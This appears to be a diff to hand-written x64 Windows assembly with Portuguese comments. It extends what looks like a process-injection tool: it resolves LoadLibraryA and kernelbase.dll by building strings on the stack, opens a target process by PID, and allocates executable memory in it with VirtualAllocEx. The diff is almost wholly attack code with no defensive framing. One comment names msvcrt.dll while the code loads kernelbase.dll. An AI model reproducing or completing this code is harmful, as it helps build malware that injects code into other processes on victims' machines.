@@ -494,6 +494,20 @@ WinMain:
                 mov r8, rbx;              # Copia o endereco base da ntdll para o registrador R8
         ret
 
+        LoadLibrary:        
+                mov rcx, 0x41797261;  
+                push rcx;  
+                mov rcx, 0x7262694c64616f4c;  
+                push rcx;  
+                mov rdx, rsp;   # joga o ponteiro de LoadLibraryA para RDX
+                mov rcx, r8;    # Copia endereco base do Kernel32 para RCX
+                sub rsp, 0x30;  # Make some room on the stack
+                call r14;       # Call GetProcessAddress
+                add rsp, 0x30;  # Remove espaço alocado na pilha
+                add rsp, 0x10;  # Remove a string LoadLibrary alocada 
+                mov rsi, rax;   # Guarda o endereço de loadlibrary em RSI
+        ret
+
         PrepareInject:
                 call Locate_kernel32
                 mov rdi,r8
@@ -662,22 +676,87 @@ WinMain:
                                 call r13
 
 
-                FimGetPid:
-                add rsp, 0x160
-                add rsp, 0x10 
+                        FimGetPid:
+                                mov rbp,rax
+                                add rsp, 0x160
+                                add rsp, 0x10 
 
-                call Locate_kernel32
-                ;lookup ExitProcess
-                mov rax, "ess"
-                push rax
-                mov rax, "ExitProc"
-                push rax
-                lea rdx, [rsp]
-                mov rcx, r8
-                sub rsp, 0x30
-                call r14
-                mov r12 ,rax
+                        call Locate_kernel32
+                        call LoadLibrary
 
-                call r12
-                                              
+                        loadKernelbase:
+                                ; Load msvcrt.dll
+                                mov rax, "se.dll"     
+                                push rax
+                                mov rax, "kernelba"
+                                push rax
+                                mov rcx, rsp
+                                sub rsp, 0x30
+                                call rsi
+                                mov r15,rax
+                                add rsp, 0x30
+                                add rsp, 0x10
+
+
+                        OpenProcess:
+                                ;Lookup OpenProcess
+                                mov rax, "ess"
+                                push rax
+                                mov rax, "OpenProc"
+                                push rax
+                                lea rdx, [rsp]
+                                mov rcx, r15
+                                sub rsp, 0x30
+                                call r14
+                                mov r12, rax
+                                add rsp, 0x30
+
+                                ;call OpenProcess
+                                xor edx,edx
+                                mov ecx, 0x2000000
+                                mov r8, rbp
+                                sub rsp, 0x30
+                                call r12
+                                mov r13, rax
+                                add rsp, 0x30
+
+                        VirtualAllocEx:
+                                ;Lookup VirtualAllocEx
+                                mov rax, "llocEx"
+                                push rax
+                                mov rax, "VirtualA"
+                                push rax
+                                lea rdx, [rsp]
+                                mov rcx, r15
+                                sub rsp, 0x30
+                                call r14
+                                mov r12, rax
+
+                                ;call VirtualAllocEx
+                                xor rcx,rcx
+                                xor rbx,rbx
+                                mov rbx, [TamArqTarget]
+                                mov r8d, ebx
+                                xor edx,edx
+                                mov rcx, r13
+                                mov [rsp+0x20], dword 0x40
+                                mov r9d, 0x1000
+                                mov rbp, r13
+                                call r12
+
+
+                        call Locate_kernel32
+                        ;lookup ExitProcess
+                                mov rax, "ess"
+                                push rax
+                                mov rax, "ExitProc"
+                                push rax
+                                lea rdx, [rsp]
+                                mov rcx, r8
+                                sub rsp, 0x30
+                                call r14
+                                mov r12 ,rax
+
+                                call r12
+                                                
 ret
